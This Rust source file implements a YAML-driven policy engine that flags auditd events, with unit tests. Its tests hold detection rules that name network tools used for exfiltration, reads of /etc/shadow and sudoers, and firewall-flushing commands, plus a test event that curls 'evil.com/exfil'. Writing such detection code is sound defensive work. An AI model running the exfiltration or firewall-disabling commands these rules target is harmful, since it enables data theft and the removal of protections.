use std::path::Path;

use anyhow::{Context, Result};
use serde::Deserialize;

use crate::alerts::Severity;
use crate::auditd::ParsedEvent;

/// A single policy rule loaded from YAML
#[derive(Debug, Clone, Deserialize)]
pub struct PolicyRule {
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(rename = "match")]
    pub match_spec: MatchSpec,
    pub action: String,
    /// If set (allow/deny), this is a clawsudo enforcement rule — skip in detection-only pipeline
    #[serde(default)]
    pub enforcement: Option<String>,
}

/// Match specification within a rule
#[derive(Debug, Clone, Deserialize, Default)]
pub struct MatchSpec {
    /// Exact binary name matches (basename)
    #[serde(default)]
    pub command: Vec<String>,
    /// Substring matches against the full command string
    #[serde(default)]
    pub command_contains: Vec<String>,
    /// Glob patterns for file path access
    #[serde(default)]
    pub file_access: Vec<String>,
    /// If any of these strings appear in args, skip the match (whitelist)
    #[serde(default)]
    pub exclude_args: Vec<String>,
}

/// Result of a policy evaluation
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PolicyVerdict {
    pub rule_name: String,
    pub description: String,
    pub action: String,
    pub severity: Severity,
}

/// Top-level YAML structure
#[derive(Debug, Deserialize)]
struct PolicyFile {
    #[serde(default)]
    rules: Vec<PolicyRule>,
}

/// The policy engine: loads rules from YAML files and evaluates events against them.
#[derive(Debug, Clone)]
pub struct PolicyEngine {
    rules: Vec<PolicyRule>,
}

fn action_to_severity(action: &str) -> Severity {
    match action.to_lowercase().as_str() {
        "critical" | "block" => Severity::Critical,
        "warning" => Severity::Warning,
        "info" => Severity::Info,
        _ => Severity::Info,
    }
}

fn severity_rank(s: &Severity) -> u8 {
    match s {
        Severity::Critical => 3,
        Severity::Warning => 2,
        Severity::Info => 1,
    }
}

impl PolicyEngine {
    /// Create an empty policy engine
    pub fn new() -> Self {
        Self { rules: Vec::new() }
    }

    /// Load all .yaml/.yml files from a directory
    pub fn load(dir: &Path) -> Result<Self> {
        let mut rules = Vec::new();

        if !dir.exists() {
            return Ok(Self { rules });
        }

        let entries = std::fs::read_dir(dir)
            .with_context(|| format!("Failed to read policy dir: {}", dir.display()))?;

        for entry in entries {
            let entry = entry?;
            let path = entry.path();
            match path.extension().and_then(|e| e.to_str()) {
                Some("yaml") | Some("yml") => {
                    // Skip clawsudo policies — those are compiled into the clawsudo binary
                    // and should NOT be evaluated in the auditd monitoring pipeline
                    if let Some(fname) = path.file_name().and_then(|f| f.to_str()) {
                        if fname.starts_with("clawsudo") {
                            continue;
                        }
                    }
                    let content = std::fs::read_to_string(&path)
                        .with_context(|| format!("Failed to read {}", path.display()))?;
                    let pf: PolicyFile = serde_yaml::from_str(&content)
                        .with_context(|| format!("Failed to parse {}", path.display()))?;
                    rules.extend(pf.rules);
                }
                _ => {}
            }
        }

        Ok(Self { rules })
    }

    /// Load from multiple directories (first found wins, but all are loaded)
    pub fn load_dirs(dirs: &[&Path]) -> Result<Self> {
        let mut engine = Self::new();
        for dir in dirs {
            if dir.exists() {
                let loaded = Self::load(dir)?;
                engine.rules.extend(loaded.rules);
            }
        }
        Ok(engine)
    }

    /// Number of loaded rules
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Evaluate an event against all rules. Returns the highest-severity match.
    pub fn evaluate(&self, event: &ParsedEvent) -> Option<PolicyVerdict> {
        let mut best: Option<PolicyVerdict> = None;

        for rule in &self.rules {
            // Skip enforcement-only rules (clawsudo) in detection pipeline
            if rule.enforcement.is_some() {
                continue;
            }
            if self.matches_rule(rule, event) {
                let severity = action_to_severity(&rule.action);
                let dominated = best.as_ref().map_or(true, |b| severity_rank(&severity) > severity_rank(&b.severity));
                if dominated {
                    best = Some(PolicyVerdict {
                        rule_name: rule.name.clone(),
                        description: rule.description.clone(),
                        action: rule.action.clone(),
                        severity,
                    });
                }
            }
        }

        best
    }

    fn matches_rule(&self, rule: &PolicyRule, event: &ParsedEvent) -> bool {
        let spec = &rule.match_spec;

        // Command match (exact binary name)
        if !spec.command.is_empty() {
            if let Some(ref cmd) = event.command {
                let binary = event.args.first()
                    .map(|s| s.rsplit('/').next().unwrap_or(s))
                    .unwrap_or("");

                if spec.command.iter().any(|c| c.eq_ignore_ascii_case(binary)) {
                    // Check exclude_args
                    if !spec.exclude_args.is_empty() {
                        let full = cmd.to_lowercase();
                        let args_str: Vec<String> = event.args.iter().map(|a| a.to_lowercase()).collect();
                        if spec.exclude_args.iter().any(|excl| {
                            let excl_lower = excl.to_lowercase();
                            full.contains(&excl_lower) || args_str.iter().any(|a| a.contains(&excl_lower))
                        }) {
                            return false;
                        }
                    }
                    return true;
                }
            }
        }

        // Command contains (substring in full command)
        if !spec.command_contains.is_empty() {
            if let Some(ref cmd) = event.command {
                let cmd_lower = cmd.to_lowercase();
                if spec.command_contains.iter().any(|pattern| {
                    cmd_lower.contains(&pattern.to_lowercase())
                }) {
                    return true;
                }
            }
        }

        // File access (glob match on file path)
        if !spec.file_access.is_empty() {
            if let Some(ref path) = event.file_path {
                if spec.file_access.iter().any(|pattern| {
                    glob_match::glob_match(pattern, path)
                }) {
                    return true;
                }
            }
            // Also check args for file paths
            if event.command.is_some() {
                for arg in &event.args {
                    if arg.starts_with('/') {
                        if spec.file_access.iter().any(|pattern| {
                            glob_match::glob_match(pattern, arg)
                        }) {
                            return true;
                        }
                    }
                }
            }
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_exec_event(args: &[&str]) -> ParsedEvent {
        ParsedEvent {
            syscall_name: "execve".to_string(),
            command: Some(args.join(" ")),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: None,
            success: true,
            raw: String::new(),
        }
    }

    fn make_syscall_event(name: &str, path: &str) -> ParsedEvent {
        ParsedEvent {
            syscall_name: name.to_string(),
            command: None,
            args: vec![],
            file_path: Some(path.to_string()),
            success: true,
            raw: String::new(),
        }
    }

    fn sample_yaml() -> &'static str {
        r#"
rules:
  - name: "block-data-exfiltration"
    description: "Block curl/wget to unknown hosts"
    match:
      command: ["curl", "wget", "nc", "ncat"]
      exclude_args: ["api.anthropic.com", "api.openai.com", "github.com"]
    action: critical

  - name: "deny-shadow-read"
    description: "Alert on /etc/shadow access"
    match:
      file_access: ["/etc/shadow", "/etc/sudoers", "/etc/sudoers.d/*"]
    action: critical

  - name: "deny-firewall-changes"
    description: "Alert on firewall modifications"
    match:
      command_contains: ["ufw disable", "iptables -F", "nft flush"]
    action: critical

  - name: "recon-detection"
    description: "Flag reconnaissance commands"
    match:
      command: ["whoami", "id", "uname", "env", "printenv"]
    action: warning
"#
    }

    fn load_from_str(yaml: &str) -> PolicyEngine {
        let pf: PolicyFile = serde_yaml::from_str(yaml).unwrap();
        PolicyEngine { rules: pf.rules }
    }

    #[test]
    fn test_parse_yaml_rules() {
        let engine = load_from_str(sample_yaml());
        assert_eq!(engine.rule_count(), 4);
        assert_eq!(engine.rules[0].name, "block-data-exfiltration");
        assert_eq!(engine.rules[3].action, "warning");
    }

    #[test]
    fn test_command_match_curl_critical() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["curl", "http://evil.com/exfil"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "block-data-exfiltration");
        assert_eq!(verdict.severity, Severity::Critical);
    }

    #[test]
    fn test_file_access_glob() {
        let engine = load_from_str(sample_yaml());
        let event = make_syscall_event("openat", "/etc/sudoers.d/custom");
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "deny-shadow-read");
        assert_eq!(verdict.severity, Severity::Critical);
    }

    #[test]
    fn test_file_access_exact() {
        let engine = load_from_str(sample_yaml());
        let event = make_syscall_event("openat", "/etc/shadow");
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "deny-shadow-read");
    }

    #[test]
    fn test_exclude_args_whitelist() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["curl", "https://api.anthropic.com/v1/messages"]);
        let verdict = engine.evaluate(&event);
        assert!(verdict.is_none(), "curl to whitelisted host should not match");
    }

    #[test]
    fn test_no_match_returns_none() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["ls", "-la", "/tmp"]);
        assert!(engine.evaluate(&event).is_none());
    }

    #[test]
    fn test_command_contains_match() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["ufw", "disable"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "deny-firewall-changes");
    }

    #[test]
    fn test_recon_warning() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["whoami"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.severity, Severity::Warning);
    }

    #[test]
    fn test_highest_severity_wins() {
        // An event matching both critical and warning should return critical
        let yaml = r#"
rules:
  - name: "low"
    description: "low"
    match:
      command: ["curl"]
    action: warning
  - name: "high"
    description: "high"
    match:
      command: ["curl"]
    action: critical
"#;
        let engine = load_from_str(yaml);
        let event = make_exec_event(&["curl", "http://evil.com"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.severity, Severity::Critical);
        assert_eq!(verdict.rule_name, "high");
    }

    #[test]
    fn test_load_from_directory() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("test.yaml"), sample_yaml()).unwrap();
        let engine = PolicyEngine::load(dir.path()).unwrap();
        assert_eq!(engine.rule_count(), 4);
    }

    #[test]
    fn test_load_nonexistent_dir() {
        let engine = PolicyEngine::load(Path::new("/nonexistent/path")).unwrap();
        assert_eq!(engine.rule_count(), 0);
    }
}
